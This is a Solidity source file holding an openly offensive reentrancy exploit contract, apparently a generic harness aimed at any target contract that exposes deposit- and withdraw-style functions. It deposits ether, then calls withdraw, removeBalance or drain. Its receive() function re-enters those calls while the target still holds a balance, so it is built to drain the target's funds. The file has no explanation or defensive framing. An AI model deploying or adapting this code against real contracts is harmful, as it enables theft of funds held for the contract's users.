// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function addBalance() external payable;
    function fund() external payable;
    function withdraw() external;
    function removeBalance() external;
    function drain() external;
}

contract ReentrancyAttacker {
    IVulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = IVulnerableContract(_vulnerableContractAddress);
    }

    function attack() external payable {
        // Try different deposit-like functions
        if (address(vulnerableContract).balance == 0) {
            try vulnerableContract.deposit{value: msg.value}() {} catch {}
        }
        if (address(vulnerableContract).balance == 0) {
            try vulnerableContract.addBalance{value: msg.value}() {} catch {}
        }
        if (address(vulnerableContract).balance == 0) {
            try vulnerableContract.fund{value: msg.value}() {} catch {}
        }

        // Try different withdraw-like functions
        try vulnerableContract.withdraw() {} catch {}
        try vulnerableContract.removeBalance() {} catch {}
        try vulnerableContract.drain() {} catch {}
    }

    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            try vulnerableContract.withdraw() {} catch {}
            try vulnerableContract.removeBalance() {} catch {}
            try vulnerableContract.drain() {} catch {}
        }
    }
}
